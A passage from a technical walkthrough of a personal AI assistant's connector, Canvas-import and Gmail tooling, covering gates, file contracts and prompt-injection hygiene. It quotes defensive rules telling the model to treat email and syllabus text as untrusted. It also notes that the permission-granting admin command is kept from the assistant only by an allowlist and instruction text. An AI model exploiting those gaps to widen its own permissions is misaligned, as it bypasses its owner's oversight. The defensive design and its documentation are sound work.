| `set <name> <setting>=<value>` | connector, setting key, value | stores a non-secret setting in `settings.json` (0600) | spec, settings | settings file | none |
| `how` | none | prints how to write a connector (text quoted below) | none | none | none |
| `canvas-courses` | none | prints the complete active-enrollment list as JSON (`{status, source_urls, retrieved_at, data}`) | built-in Canvas spec, settings, Keychain | none | paginated Canvas GETs |
| `canvas-course <course_id>` | numeric id (a leading `course_id=` is stripped, line 198) | prints a full course snapshot JSON (course + assignments + quizzes + assignment_groups, each with provenance) | same | none | several paginated Canvas GETs |

  There are no named flags besides `--json` and `--file` on `create`. Unknown command falls through to the usage line, exit 2 (line 240). All `fail(...)` calls print to stdout (line 36) and exit 1 unless given another code; exit 0 is used for success and for `help`.

  Walk of each important path:
  1. **Specs are discovered** from two directories, in this order: `scripts/connectors` (`BUILTIN`, line 30) then `DIR` = `$ORION_CONNECTORS_DIR` or `~/.openclaw/orion-connectors` (line 29). Later entries with the same `name` win in the `Map`, but `create` refuses to shadow a built-in (`orion-connect:165`). `settings.json` and `writes-allowed.json` in the directory are excluded from spec discovery (line 42). Built-ins are flagged `builtin:true`, and `list` marks the others "(built by ORION)".
  2. **Secrets.** `secret(item)` (lines 50-53) runs exactly `/usr/bin/security find-generic-password -a openclaw -s "<item>" -w` and returns the trimmed stdout, or null on any failure. The account is the literal string `openclaw`, the service is the item name (`ORION Canvas` for Canvas). Nick adds one with `security add-generic-password -a openclaw -s "ORION Canvas" -w` and pastes at the prompt; `needs()` (55-62) prints that exact command in the "NEEDS" message, including `howToGet`. The secret value is never printed; failure messages only say whether it is present.
  3. **`run`** (207-238), in order: look up spec (210); `validateSpec` (211); `needs()` must be empty, i.e. all required settings filled and secret present (213); parse `k=v` pairs (215); `buildRequest` with that connector's saved settings (216); **write gate**: if the operation is a write and `writes-allowed.json[name] !== true`, refuse with "Nick has to allow writes for <name> first (orion-connect-admin allow-writes <name>)" (218); headers `accept: application/json` and `user-agent: ORION/1 (personal assistant)` (219); auth attached by type: `bearer` sets `authorization: Bearer <key>`, `header` sets `<header>: <key>`, `query` appends `<param>=<key>` to the URL (221-226); `fetch` with `AbortSignal.timeout(20000)` and `redirect: "error"` (229) so an HTTP redirect cannot carry the credential elsewhere; non-2xx prints `"<title> said <status>: <first 300 chars of body, whitespace collapsed>"` (232); success body is parsed as JSON and passed through `keepFields(.., op.keep, op.limit ?? 8)`, non-JSON bodies are cut to 3,000 characters (234); output is pretty-printed JSON, and if longer than 7,000 characters it is cut with a note telling ORION to add `keep` fields (236).
  4. **`list`'s `systemStatus()`** (67-96) is a broad health probe. It runs: the Mac bridge binary (first existing of `~/.openclaw/orion-remote/bin/orion-mac-bridge` or `native/OrionMacBridge/.build/release/orion-mac-bridge`) with one JSON line on stdin `{"id":"c","action":"list_deadlines","payload":{}}` and again for `list_incomplete_reminders`, checking for `"ok":true` (both are reads); opens `~/Library/Messages/chat.db` read-only just to see whether Full Disk Access exists (76); spawns `orion-gmail-latest` and judges by exit status and text (78-80, distinguishing `invalid_grant|revoked|expired` as "DISCONNECTED - Google revoked the token; Nick re-grants with `gog auth manage`"); reads `~/.openclaw/orion-controlled/health-log.json` for the latest WHOOP day (81-83); the age of `finance-summary.json` (84-85, labelled "Bank (Plaid)"); `~/Library/Application Support/ORION Link/status.json` (86-87); last phone signal time (88-89); `launchctl list` for `com.nickmadaio.orion.remote` (Discord bridge, 90-91); existence of unix sockets `~/.openclaw/orion-tts.sock` and `~/.openclaw/orion-voiceid.sock` (92-93). Lesson baked in: this exists because Gmail died silently twice and "everything local looks healthy" (`scripts/orion-doctor:300-315` records the same incident).
  5. **`canvas-course(s)`** (175-205) always use the shipped `canvas.json` from `BUILTIN`, not a user-created substitute (comment lines 176-178), re-validate it, and use their own `fetchJSON`: `fetch(url, {headers:{accept:'application/json', authorization:`Bearer ${key}`}, signal: AbortSignal.timeout(20000), redirect:'error'})`. A non-2xx returns `{ok:false,status}` (not an exception) so the library can mark a resource `unavailable`. Body is rejected if the raw text exceeds 2 MiB (`2 << 20`, line 191) or is not JSON; the final snapshot is rejected above 4 MiB (201). The Link header is passed back so pagination can follow it. Output is a single JSON line on stdout for `orion-brain` to parse.
  6. **`create`** (157-173): parse JSON from `--json` or the file named after `--file` (161); the spec's `name` must equal the CLI name (163); refuse if a built-in has that name (164-165); `validateSpec` issues are printed as `Not created:` plus a bullet list (167); otherwise write the file (0600) with `createdAt`; print any still-missing settings/secret.
  7. **`set`** (143-155): the key must be declared in the spec's `settings` (148); keys matching `/token|secret|key|password/i` are refused ("Secrets go in the Keychain, not settings", 149); value is everything after the first `=`; the file `settings.json` is merged per connector name and written 0600.
  8. **`how`** prints this text (113-126, quoted in part):

```text
// scripts/orion-connect:125-126
Read the API's docs first (web_search, web_fetch). GET only. {{x}} is a required parameter, {{x?}} optional.
Then test it: orion-connect run <name> <op> k=v. If it needs a key, tell Nick the exact Keychain command that orion-connect list prints.
```

  This is instruction text that ORION reads at run time (it is printed to ORION's tool result, so it is effectively a prompt snippet; there is no separate model call).
- **Contracts.**
  - Env: `ORION_CONNECTORS_DIR` (default `~/.openclaw/orion-connectors`, line 29). No other env var.
  - Files on disk: `~/.openclaw/orion-connectors/<name>.json` (user-built specs, 0600), `.../settings.json` (`{ "<connector>": { "<setting>": "<value>" } }`, 0600), `.../writes-allowed.json` (`{ "<connector>": true|false }`, written only by `orion-connect-admin`). Built-ins are read from `scripts/connectors/`.
  - Keychain: items named `ORION <Name>` under account `openclaw`. Canvas uses `ORION Canvas`. (Other secrets in the Swift app are handled by the app's own `SecretStore`, not this script.)
  - Output: JSON (pretty) or plain text; exit 0 on success.
- **Calls out to.**
  - `/usr/bin/security find-generic-password -a openclaw -s <item> -w` (Keychain).
  - HTTPS GET to the connector host. For Canvas: `https://<domain>/api/v1/...` (exact paths in 7.1); for TfL: `https://api.tfl.gov.uk/...`.
  - `node <scripts>/orion-gmail-latest` and the Mac bridge only from `list`.
  - Rate/scope limits: 20 s timeout per request, 7,000-char output cut (`run`), 2 MiB per Canvas response, 4 MiB per snapshot, 20-page pagination cap per resource (7.4). The tool does no rate limiting of its own; Canvas and TfL enforce theirs. The Canvas token's scope is whatever Canvas gave that personal access token, which in Canvas is typically the full user (assumption **(inferred)**: Canvas personal access tokens are not scoped to read-only; the read-only guarantee here is the code's GET-only design).
- **What goes to a model.** The tool result text (the trimmed JSON) goes back to whichever model ORION is running (the main OpenClaw agent). Canvas syllabus and assignment descriptions are free text written by instructors; the vault importer (7.4) treats them as untrusted evidence and quotes them (`> ` prefix) so they cannot create headings.
- **Gates.** There is no approval prompt. The gates are: (a) writes need `writes-allowed.json[name] === true`, and only `orion-connect-admin` (not on ORION's exec allowlist, 7.3) writes that file; but note `run` has no body support so a "write" op is just a non-GET method with query params today; (b) `redirect:"error"`; (c) https-only and same-host checks in `spec.mjs`; (d) the Keychain item is read only inside this process and only attached to the connector's request.
- **History.** `c2eda84` 2026-09-30 created it ("connections" section of HANDOFF 2026-09-30 10:00 BST, `HANDOFF.md:383-387`); `320626f` 2026-10-06 added `canvas-course`, `canvas-courses` and the 2 MiB / 4 MiB bounds.
- **Gotchas & lessons.**
  - `list` is not free: it performs a real Gmail read and two bridge reads, so do not call it in a loop.
  - `fail()` prints to stdout, not stderr, so callers that only look at stderr (like some plugin wrappers) will miss the message.
  - `set` has no host validation (see 7.1 Gotchas).
  - The first line of `help` is generated by regex over the file's own header comment (line 98), so editing the header changes the help output.
- **Walk it yourself.**
  1. `sed -n 50,62p scripts/orion-connect` for the Keychain call and the exact "NEEDS" wording.
  2. `sed -n 207,238p scripts/orion-connect` for the `run` order of checks.
  3. `node scripts/orion-connect how` and `node scripts/orion-connect show tfl` are harmless (no network, no Keychain secret read for `tfl`). Do NOT run `list` casually (it calls Gmail and the bridge).
- **Questions to ask your tutor.**
  1. Why is the secret read inside the same script that makes the request, instead of being passed to ORION?
  2. What does `redirect: "error"` protect against?
  3. Why does `canvas-course` ignore user-made connectors and read the built-in spec directly?
  4. What would it take to add a real write operation (POST with a body) safely?
  5. Which lines would you change so that a connector can never reach a host other than the one the secret was registered for?

---

### 7.3 `orion-connect-admin`

- **What it is.** Nick's three switches for connectors (27 lines, `scripts/orion-connect-admin`). It is deliberately **not** on ORION's exec allowlist (header, lines 2-4), so letting a connector change data somewhere is Nick's decision. `README.md:111` lists it among "commands that expand ORION's own permissions" that ORION must not run.
- **Where.** Whole file; parse at line 15, allow/revoke 18-20, remove 21-24, usage 25-26.
- **How it works.**

| Subcommand | Args | Effect |
|-----------|------|--------|
| `allow-writes <name>` | connector name | writes `{...existing, <name>: true}` into `writes-allowed.json` (0600) and prints "`<name>`: writes allowed." |
| `revoke-writes <name>` | connector name | same file, sets `<name>: false` |
| `remove <name>` | connector name | `rmSync(<DIR>/<name>.json)`; "No connector `<name>` built by ORION." (exit 1) if the file is not in `DIR` (so built-ins in `scripts/connectors` cannot be removed) |
| anything else | | prints usage, exit 2 |

  Note it does not validate that `<name>` exists for allow/revoke (it will happily record a switch for a nonexistent connector), and a missing name becomes the string key `"undefined"`. The directory is `ORION_CONNECTORS_DIR` or `~/.openclaw/orion-connectors` (line 13).
- **Contracts.** Reads and writes `writes-allowed.json`; deletes `<name>.json`. No network, no Keychain.
- **Gates.** The only gate is that ORION is not given this command: it is enforced by the exec allowlist in `~/.openclaw/exec-approvals.json` (not read here) and by plugin instruction text, not by code in this file. Anyone who can run a shell as Nick's user can run it.
- **History.** `c2eda84` 2026-09-30 only.
- **Gotchas.** No confirmation prompt. `remove` of a name that has both a user file and the same name as a built-in only deletes the user file.
- **Questions to ask your tutor.** (1) Why is "who can run this" the whole security model here? (2) What are the trade-offs of keeping the switch in a JSON file ORION can technically read? (3) How would you make `allow-writes` require a fresh authentication?

---

### 7.4 Canvas library (`canvas.mjs`, `course-notes.mjs`, `course-vault.mjs`) and `orion-brain canvas-*`

- **What it is.** The 2026-10-06 feature that turns a Canvas course into notes in Nick's Obsidian-style vault (`~/Documents/orionBrain`). Three layers, each in its own file so each can be tested and reasoned about alone: (1) `canvas.mjs` retrieves metadata over paginated GETs and returns a *snapshot*; (2) `course-notes.mjs` is a **pure planner**: given a snapshot and the current notes it returns the exact before/after text of each file it would change; (3) `course-vault.mjs` is the **only writer**: optimistic conflict checks, backups, atomic rename, rollback. The CLI that ties them together is `scripts/orion-brain` (`canvas-courses`, `canvas-refresh`), which shells out to `orion-connect` for the network part.
- **Where.**
  - `scripts/lib/connect/canvas.mjs` (54 lines): `canvasId` 6-9, `canvasRead` 11-39, `canvasCourseSnapshot` 41-54.
  - `scripts/lib/connect/course-notes.mjs` (232 lines): constants 5-8, `plainText` 13-24, escaping 26-27, `property` 29-34, `excludedCourses` 36-40, `previewCourseRefresh` 42-50, `updateProperties` 52-68, `managed` 70-83, `markPriorCanvasObservations` 85-99, `valueLabel` 101-106, `dateLabel` 108-116, `provenance` 118-125, `providerContent` 127-133, `safeName` 135-139, `planCourseRefresh` 141-232.
  - `scripts/lib/connect/course-vault.mjs` (79 lines): `ordinaryPath` 8-25, `loadCourseVault` 27-38, `applyCourseRefresh` 40-79.
  - `scripts/orion-brain:36-75` (the `canvas-*` branch).
- **How it works.**
  1. **Retrieval** (`canvasRead`, `canvas.mjs:11-39`). Build the request with `buildRequest` (7.1); insist it is a GET and not a write (14). Loop: for each URL, refuse unless it has the same origin and the same pathname as the first URL, no user/password, no `#hash` and no `access_token` query parameter (21-23) ("Link URLs are opaque, but never authority to send the credential elsewhere", comment 19-20); refuse repeats or more than 20 pages (24); fetch; a non-ok response returns `{status:"unavailable", http_status, source_urls, retrieved_at}` rather than throwing (27), so an optional endpoint stays "unavailable", never an empty list (header comment, line 2); lists accumulate across pages; the next URL is parsed from the `Link` header's `rel="next"` (30-31); when no next link remains, return `{status:"available", source_urls, retrieved_at, data: keepFields(body, op.keep, 2000)}` (36).
  2. **Snapshot** (`canvasCourseSnapshot`, 41-54): validate the id is a positive decimal integer (6-9); call `courses` and require that the requested id is in the *active enrollments* ("Requested course is not in your active Canvas enrollments", 45); call `course` (with `include[]=syllabus_body`); then `assignments`, `quizzes`, `assignment_groups` in sequence. Result `{schema_version:1, course_id, retrieved_at, course, assignments, quizzes, assignment_groups}`; each resource carries its own `status`, `source_urls`, `retrieved_at`. Requests are strictly metadata: no submissions, quiz attempts or questions (header, lines 1-2).
  3. **Planning** (`planCourseRefresh(snapshot, parentName, notes, schoolNote)`, `course-notes.mjs:141-232`):
     - Refuse if Nick excluded the course: the university note `20 Areas/School/Northeastern University London.md` carries a frontmatter property `canvas_excluded_course_ids` (a JSON array of ids; `excludedCourses`, 36-40, throws on malformed values).
     - Require snapshot `schema_version === 1`, course available and id match, assignments available (144-145).
     - The parent note must already exist under `20 Areas/School/Courses/<name>.md` with frontmatter `type: course` ("Choose an existing course note; no parallel hierarchy will be created", 147). The Canvas `course_code` plus `name` must match the chosen note name as a whole word (150-151). If the note already has `canvas_course_id` it must equal this course (152-153).
     - Assignments must have unique ids and match the course id (155-159). Items whose name matches "information and assessment brief"/"assessment brief" are treated as supplements, not graded children (161-162).
     - For each primary assignment: compute a note title `"<course> <assessment>"` (an "AE1: Exam" name becomes `AE1`, 169); find an existing `type: assessment` note by `canvas_assignment_id` or by normalised title (171-175); more than one candidate is an error (176); a title collision is an error (178). If none exists a new assessment note is generated with frontmatter and `part_of [[course]]` / `taken_by [[Nick]]` relations (182). Then it writes frontmatter properties `canvas_course_id`, `canvas_assignment_id`, `canvas_retrieved_at`, `canvas_source_url`, `due`, `opens`, `lock_at` and a `canvas_<field>_status` of `available|not_set|unavailable` per timing field (183-194). A missing field is never faked as empty; the prior value is preserved as `prior_canvas_<field>` (190-191).
     - The note body inside the managed block lists provenance links, `[opens]`/`[due]`/`[locks]` with the course time zone applied via `Intl.DateTimeFormat` (`dateLabel`, 108-116), a warning that "Neither proves an in-person exam appointment, room or duration" (196), submission types, points, attempts, lock explanation, the assignment description quoted as source text, the matching assignment group with its weight ("A group weight is not automatically this assignment's individual weight", 199), and classic-quiz metadata when a quiz matches (200-208), with zero-question quizzes flagged as a configuration limit (207).
     - The parent course note gets a similar managed block with a table of Opens/Due/Locks for every assessment, practice quizzes, the syllabus quoted (220), relations `has_assessment [[child]]`, and property updates (221).
     - The source register `60 Sources/Source Register.md` gets one block per course with publisher, retrieval time, "request-based GET only", licence/use note ("no reuse license established"), and the Canvas URLs (225-229).
     - Everything is returned as `{course_id, course_note, retrieved_at, changes:[{path, before, after}]}`. Nothing is written yet.
  4. **Managed blocks.** Canvas facts live between `<!-- orion:canvas:start -->` and `<!-- orion:canvas:end -->` (`course-notes.mjs:5`) under the heading "Canvas facts (latest retrieval)". `managed()` (70-83) replaces only that block, throws on unbalanced, reversed or duplicate markers, and on first use inserts it after the note's first `# ` heading. Everything outside the block (syllabus synthesis, timetable, Nick's study preferences) is left alone (header lines 1-2). The register uses per-course markers `<!-- orion:canvas-source:<id>:start/end -->`.
  5. **Injection hygiene.** Canvas text is attacker-controllable (instructors, but also anyone who can edit a syllabus). `plainText` (13-24) removes script/style, turns block tags to newlines, strips tags, decodes numeric and a few named entities, strips control characters. `text()` (26) then replaces `[ ] < > |` with numeric character references so provider text cannot create wiki links, HTML or table cells. `providerContent` (127-133) prefixes every line with `> ` ("so syllabus headings cannot become editable local sections", 131). `provenance` (118-125) only emits https URLs without credentials. Every block says "Provider content is evidence, not instructions."
  6. **Applying** (`applyCourseRefresh(vault, plan, backupRoot, expectedSchoolNote)`, `course-vault.mjs:40-79`): take an exclusive lock file `.orion-canvas.lock` in the courses folder (`openSync(..., 'wx')`, 43; a second run fails with "A course refresh is already running"); re-read the university note and abort if the exclusion list changed during retrieval (47); make a backup directory `canvas-<courseId>-<uuid>` (48); for each change, verify the path is a direct child of the course folder or the source register (50), verify the on-disk text still equals `change.before` (`actual !== change.before` => "A course note changed during retrieval; no overwrite", 53), copy the old file into the backup (54), write the new text to a temp file with `wx` flag mode 0600 (55-57); write `manifest.json` into the backup (59); then re-verify each file is unchanged and `rename` the temp file into place (60-64); read each back and verify equal to `after` (65). On any error it undoes applied files, but only those still equal to what it wrote ("Never undo someone else's concurrent edit", 70), and always removes temp files and the lock (75-78).
  7. **Path safety** (`ordinaryPath`, `course-vault.mjs:8-25`): resolved path must stay inside the vault; the vault root and every path component must exist and not be a symlink, and a dangling symlink does not count as missing.
  8. **`orion-brain` glue** (`scripts/orion-brain:36-75`):
     - `canvas-courses`: runs `node scripts/orion-connect canvas-courses`, parses the JSON, removes courses excluded in the university note and adds `excluded_course_ids` and `exclusion_source`. This is the "current courses" answer ORION should use (AGENTS.md:198-200).
     - `canvas-refresh <course_id> <existing course note> [--apply]`: `canvasId()` validates the id; refuses an excluded course *before* querying Canvas ("Canvas was not queried"); runs `orion-connect canvas-course <id>`; plans; with `--apply` calls `applyCourseRefresh` with backup root `~/.openclaw/orion-controlled/canvas-backups`, then runs the Basic Memory CLI `reindex --project orion --search` (timeout 60 s) so the new facts become searchable; a failed reindex is reported as `pending`, not hidden. Without `--apply` it prints a `preview` listing each file with action `create|refresh` and the new Canvas block only (`previewCourseRefresh`, 42-50). AGENTS.md tells ORION to apply only "on Nick's request to import/refresh a named course" (`plugin/workspace/AGENTS.md:199-203`).
- **Contracts.**
  - Snapshot JSON: see step 2. Plan JSON: `{course_id, course_note, retrieved_at, changes:[{path (vault-relative), before (string or null), after}]}`.
  - Vault: `~/Documents/orionBrain` (hardcoded in `orion-brain:38`). Folder const `COURSE_FOLDER = "20 Areas/School/Courses"`, `SCHOOL_NOTE = "20 Areas/School/Northeastern University London.md"`, `SOURCE_REGISTER = "60 Sources/Source Register.md"` (`course-notes.mjs:6-8`).
  - Backups: `~/.openclaw/orion-controlled/canvas-backups/canvas-<courseId>-<uuid>/` (dir 0700, files 0600) with copies of each old note and `manifest.json`.
  - Limits: 20 pages per resource, 2 MiB per response, 4 MiB per snapshot, 20 s per request, `keep` limit 2,000 items per list (`canvas.mjs:36`; this overrides the spec's per-op `limit`, which only applies to the interactive `run` path).
  - Auth: Keychain item `ORION Canvas` (account `openclaw`) read by `orion-connect`, plus setting `domain` in `settings.json`.
- **Calls out to.** `https://<domain>/api/v1/courses?enrollment_state=active&per_page=100`; `/api/v1/courses/<id>?include[]=syllabus_body`; `/api/v1/courses/<id>/assignments?order_by=due_at&per_page=100`; `/api/v1/courses/<id>/quizzes?per_page=100`; `/api/v1/courses/<id>/assignment_groups?per_page=100` (all GET, bearer token). Local: Basic Memory CLI (`BM` constant in `orion-brain`) `reindex`.
- **What goes to a model.** `orion-brain` prints the plan/preview JSON and the apply result back to ORION's tool channel. The vault notes themselves later get recalled by memory search and become model context; that is why every provider string is escaped and quoted.
- **Gates.** Read-only network (GET only, enforced twice: `canvas.mjs:14` and the spec). Writes to the vault only through `orion-brain canvas-refresh --apply`, which requires the course note to already exist, refuses excluded courses, takes a lock, backs up, and rolls back. ORION's instruction text limits `--apply` to an explicit request from Nick (AGENTS.md:199-203); there is no code-level approval prompt **(inferred: I found none in `orion-brain`)**.
- **History.** `320626f` 2026-10-06 "feat(school): retrieve Canvas course facts and refresh linked brain notes" added all three libraries and the `orion-brain` branch (`HANDOFF.md:72` describes the bounds). Earlier Canvas use was only the generic `orion-connect run canvas ...` from `c2eda84` 2026-09-30.
- **Gotchas & lessons.**
  - "Due" is not "exam time": Canvas due/lock dates are not appointments. Notes repeat this in the block (`course-notes.mjs:196`). Quiz settings are current configuration, not syllabus promises (204).
  - Missing, null and empty are three different states and are labelled differently (`valueLabel`, 101-106). This came from the rule that an unavailable endpoint must never read as `[]`.
  - Assignment ids and course ids are validated as positive decimal integers everywhere (`canvasId`), because the id is interpolated into a URL path.
  - Concurrency: the lock file is stale-lock sensitive. If a run crashes hard the lock remains and the next run says "review stale lock manually if needed" (`course-vault.mjs:44`).
  - `markPriorCanvasObservations` rewrites older hand-written observation lines (for example "Canvas timezone was not shown") into `[historical_canvas_observation]` so the new API block supersedes them without deleting history (85-99).
- **Walk it yourself.**
  1. `sed -n 11,39p scripts/lib/connect/canvas.mjs` and find the five checks in the pagination guard.
  2. `sed -n 141,160p scripts/lib/connect/course-notes.mjs` for every refusal path.
  3. `sed -n 40,79p scripts/lib/connect/course-vault.mjs` and write down the order: lock, expectation check, backup, temp write, verify, rename, verify, rollback.
  4. `grep -n "canvas" scripts/orion-brain` for the CLI wiring. (Do not run `canvas-refresh`; it calls Canvas.)
- **Questions to ask your tutor.**
  1. Why is the planner pure and the writer separate? What tests does that make easy?
  2. Why does retrieval require the course to be in active enrollments before fetching it?
  3. What attack does quoting every syllabus line with `> ` prevent, and what attack does replacing `[ ] < > |` prevent?
  4. Walk through what happens if Nick edits a course note between planning and applying.
  5. Why does the "keep" list differ between `run` (limit per op) and the snapshot (2,000)?
  6. What does "prior_canvas_due" protect against?

---

### 7.5 Gmail: `orion-gog`, `gmail-client.mjs`, `gmail-format.mjs`, `orion-gmail-search`, `orion-gmail-latest`

All Gmail access goes through an external CLI called `gog` (installed at `/opt/homebrew/bin/gog` per `scripts/orion-doctor:318`; it is a third-party Google-services CLI, I did not inspect its source). `gog` holds the Google OAuth refresh token in an encrypted file keyring; the repo's scripts only supply the keyring password. ORION is told never to call `gog` directly (`plugin/workspace/AGENTS.md:291-293`, and `plugin/orion-control/src/exec-routing.ts:59` turns a direct `gog` call into a redirect message).

#### 7.5.1 `orion-gog` (wrapper)

- **What it is.** 24 lines. Runs `gog` with the vault password injected into its environment, "never printing the secret". Used by Nick (and only incidentally by the model) for account administration such as `gog auth manage`.
- **Where.** `scripts/orion-gog:1-24`.
- **How it works.** (1) `root` = parent of `scripts/` (line 8), so it reads `<repo>/.env`. (2) It parses that file line by line, skipping lines starting `#` and lines without `=`, splitting at the first `=` (note: `split("=", 2)` keeps only the text before the *second* `=`, so a value containing `=` is truncated; fine for the current password format **(inferred)**), trimming and stripping one pair of surrounding quotes (lines 9-15). (3) If `GOG_KEYRING_PASSWORD` is empty it prints "Orion's Gmail vault password is not available in local configuration." and exits 2 (16-19). (4) It spawns `gog` with all CLI arguments passed through (`process.argv.slice(2)`), environment `{...process.env, GOG_KEYRING_PASSWORD}` and `stdio:"inherit"` (20-24), exiting with gog's exit code.
- **Contracts.** Flags: none of its own; every argument is `gog`'s. Env/config **names**: `GOG_KEYRING_PASSWORD` in `<repo>/.env` (template: `.env.example`). It does *not* set `GOG_KEYRING_BACKEND` (the client library does, 7.5.2). Reads/writes: reads `.env`; `gog` itself reads/writes its own config and keyring (location **unknown to me**). Side effects depend on the `gog` subcommand: `gog gmail ...` could send mail if asked, because this wrapper adds no `--readonly` or `--gmail-no-send` flags. **That is the important difference from `gmail-client.mjs`.**
- **Gates.** None in code. It exists for Nick and for repairs (`gog auth manage` is the re-grant path recommended in `orion-connect:80` and `orion-doctor:326-331`). ORION is steered away by routing text, not by this script.
- **History.** `154c3fb` 2026-08-04 "Scripts Orion runs on his own: daily brief, voice enrollment, alerts" (first), `3a87a71` and `08cfaa8` 2026-08-04 (restore).
- **Gotchas.** The secret lives in a plaintext `.env` (listed in `docs/planning/v2/CURRENT_SECRET_INVENTORY.json`, which mentions `GOG_KEYRING`). It is passed to the child only as an environment variable, so `ps eww` visible to the same user could show it (**inferred**, standard Unix behaviour).

#### 7.5.2 `scripts/lib/gmail-client.mjs` (the safe plumbing)

- **What it is.** The one module both mail CLIs use to run `gog`. It was extracted (`93e9a42` 2026-08-20) because "the two scripts carried a byte-identical copy" of the `.env` parse and spawn code and "a fix applied to one of them silently did not apply to the other" (header lines 4-7).
- **Where.** `ACCOUNT` constant 17 (a hardcoded Gmail address; not reproduced here), `SAFETY_FLAGS` 20, `keyringEnvironment` 28-56, `gog` 64-94, `searchThreads` 97-100, `getThread` 109-111, `withSnippets` 121-135.
- **How it works.**

```js
// scripts/lib/gmail-client.mjs:64-67
export async function gog(orionRoot, args) {
  const environment = await keyringEnvironment(orionRoot);
  const argv = [...args, "--account", ACCOUNT, ...SAFETY_FLAGS, "--json"];
```

  Every call appends `--account <ACCOUNT> --readonly --gmail-no-send --json` (the flags are appended inside `gog()`, not passed by callers, "so a caller cannot forget them or opt out", lines 9-11, 20). The environment is `{...process.env, GOG_KEYRING_BACKEND:"file", GOG_KEYRING_PASSWORD:<from .env>}` (51-55). The query is an argv element and never goes through a shell ("Gmail search syntax cannot become shell syntax", 61-62). stdio is `["ignore","pipe","pipe"]`; on non-zero exit the Promise rejects with gog's own stderr text, or `gog exited <code>` (85); stdout is JSON-parsed, with an explicit "gog returned something that is not JSON" error (92). The deliberate rule: "Pass gog's own words through... never claim setup is missing" (83-84), after the incident where an invalid grant was reported as missing setup.
  - `searchThreads(root, query, max)` runs `gog gmail search <query> --max <n>` and returns `result.threads` (array) or `[]`.
  - `getThread(root, id)` runs `gog gmail thread get <id> --sanitize-content`. The comment (105-108): `--sanitize-content` strips links and active content "before it ever reaches the model. Email is untrusted data, and this is the point where that stops being a policy and becomes a mechanism." In practice links become the literal token `[url removed]`, which `gmail-format.mjs` later strips.
  - `withSnippets(root, threads)` fetches every thread in parallel (`Promise.all`) because Gmail's search result carries no snippet; it keeps only the newest message plus `messageCount`; one failing thread degrades to a summary without a preview instead of failing the search (121-134).
- **Contracts.** Inputs: repo root path, query string, limits. Output shapes: `{threads:[...]}` from search; `{thread:{id, messages:[{headers:{from,subject,date}, body, snippet, labelIds}]}}` from `thread get` (shape inferred from how `gmail-format.mjs` reads it). The Google API scope is whatever `--readonly` selects in `gog` (read-only Gmail scope; I did not verify the exact scope string).
- **Calls out to.** argv of `gog`, exactly: `gog gmail search "<query>" --max <n> --account <ACCOUNT> --readonly --gmail-no-send --json` and `gog gmail thread get <threadId> --sanitize-content --account <ACCOUNT> --readonly --gmail-no-send --json`. The Google endpoints behind these are `gog`'s business; the standard Gmail REST calls would be `users.threads.list` / `users.threads.get` **(inferred; not verified in gog)**.
- **Gotchas.** Cost model: a default (non-`--full`) search of 5 threads is 1 search call plus 5 `thread get` calls, because there is no other way to get a preview. Failure mode that matters: Gmail refresh tokens can become `invalid_grant` (revoked/expired) while all local state still looks healthy; it happened 2026-08-13 and again before 2026-09-02 (`scripts/orion-doctor:304-312`).

#### 7.5.3 `scripts/lib/gmail-format.mjs` (turning a thread into a few lines)

- **What it is.** The formatter that decides what of a mail reaches ORION's context. Reason, in the file's own words (lines 4-22): the old wrappers printed `gog gmail thread get --json` verbatim; one `in:inbox` search was about 15,000 characters, mostly unsubscribe/legal footer, while ORION's whole instruction file is capped at 20,000 characters. "A single mail search could therefore push more than his entire set of standing instructions out of the window ... Checking his email made him worse at his job."
- **Where.** `BODY_CAP` 26, `FOOTER_MARKERS` 36-50, `MIN_BODY` 60, `decodeQuotedPrintable` 76-111, `stripBoilerplate` 120-147, `capBody` 150-153, `readableSender` 156-162, `summarise` 170-189, `renderSummaries` 192-223, `renderFull` 226-247. Tests: `plugin/orion-control/src/gmail-format.test.ts` (names listed in the Walk section).
- **How it works.**
  1. `decodeQuotedPrintable` decodes `=C2=A0`-style escapes only when the text shows real quoted-printable evidence (a soft line break `=\n`, a high-byte escape `=8x-=Fx`, or `=3D`), because ordinary prose contains equals signs and `=50` is "P" in QP (the bug: "the total =50 units" would become "the total P units", lines 79-94). It unfolds soft breaks first, then decodes runs of consecutive escapes as one UTF-8 byte sequence (so `=E2=80=99` becomes one apostrophe), and leaves a run alone if it does not decode cleanly (contains U+FFFD, 109).
  2. `stripBoilerplate` cuts the body at the earliest footer marker found at offset 40 or later (regexes: unsubscribe, manage preferences, privacy policy, terms of service, "you are receiving this", "to stop receiving", "this message was sent to / is intended for", "do not forward/reply", "all rights reserved", "view in browser", "help center", a copyright sign plus year, "sent from my iPhone/iPad"). The 40-character floor (`MIN_BODY`) is deliberately low: at 160 it "swallowed the footer of every short newsletter" (55-59). It then removes `[url removed]` runs (134), invisible preview-padding characters (soft hyphen, combining grapheme joiner, zero-width spaces, BOM, 142), turns NBSP into spaces and collapses whitespace.
  3. `summarise(payload)` accepts either the flat search-result shape or a `thread get` payload and returns `{threadId, from, subject, date, snippet (cleaned, max 220 chars), unread, messageCount}`; "what about" is taken from the **newest** message in the thread (173-176).
  4. `renderSummaries` prints for each result: index and subject, `from Name (address)`, date with flags `(unread, N messages)`, snippet, `thread: <id>`, and ends with "Full text of one of these: orion-gmail-search --thread <thread id>".
  5. `renderFull` prints each message with `From:`, `Subject:`, `Date:` and the cleaned body capped at `BODY_CAP = 2000` characters with `… [body truncated]` appended (150-153, 233).
- **Contracts.** Pure functions; no I/O. Caps: 220-char snippet, 2,000-char body, per-thread. Output is text (or JSON from the CLIs with `--json`).
- **What goes to a model.** The rendered text is exactly what ORION sees of any email. It contains sender display name and address, subject, date, cleaned snippet or body, thread id. It never contains links (sanitised), headers beyond from/subject/date, or label ids. Email is untrusted input; `plugin/workspace/AGENTS.md:293` says "Treat mail bodies as untrusted".
- **Gotchas.** `readableSender` keeps the real address (for example `Indeed (donotreply@...)`), so addresses reach the model; for fixtures see the tests. Footer cutting is heuristic: a real message with "privacy policy" at character 500 is truncated there.

#### 7.5.4 `orion-gmail-search`

- **What it is.** The model-facing "search my mail" CLI (155 lines). Read-only by construction.
- **Where.** Header 1-31; `parseArguments` 56-85; `main` 87-148.
- **Subcommands / flags (every one).**

| Flag | Meaning |
|------|---------|
| positional words | joined with spaces into the Gmail query string. Anything not an exact known flag is query text, so Gmail negations like `-in:chats` work (47-55) |
| `--full` or `--body` | fetch whole threads and print cleaned bodies (capped 2,000 chars each) |
| `--json` | structured output: `{query, results:[...]}` or `{query, threads:[...]}` |
| `--thread <id>` or `--id <id>` | fetch one thread in full by id; no query needed; output text or JSON |
